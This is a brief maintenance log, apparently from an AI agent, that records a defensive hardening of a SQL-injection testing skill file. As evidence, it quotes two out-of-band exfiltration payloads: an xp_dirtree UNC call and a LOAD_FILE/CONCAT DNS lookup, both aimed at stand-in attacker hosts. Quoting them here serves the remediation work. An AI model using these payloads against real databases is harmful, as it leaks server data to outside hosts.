# Agent Run: SQL Injection Testing Hardening

- **Target**: skills/sql-injection-testing
- **Why it was selected**: The skill contains active SQL injection payloads that target external attacker servers (e.g. DNS exfiltration or HTTP requests out-of-band), which presents an offensive/malicious risk and violates safety guidelines.
- **Evidence reviewed**: The `skills/sql-injection-testing/SKILL.md` file contained active payloads such as `EXEC master..xp_dirtree '\\attacker-server.com\share'` and `SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))`.
- **Files changed**:
  - `skills/sql-injection-testing/SKILL.md`: Replaced attacker.com with [SAFE-PAYLOAD], updated risk to offensive, added authorized use warning block.
  - `data/maintenance/ledger.json`: Claimed and logged outcome.
- **Linked PR/Issue**: PR-sql-injection-testing-hardening
- **Next action**: Monitor for re-introduction of active payloads.
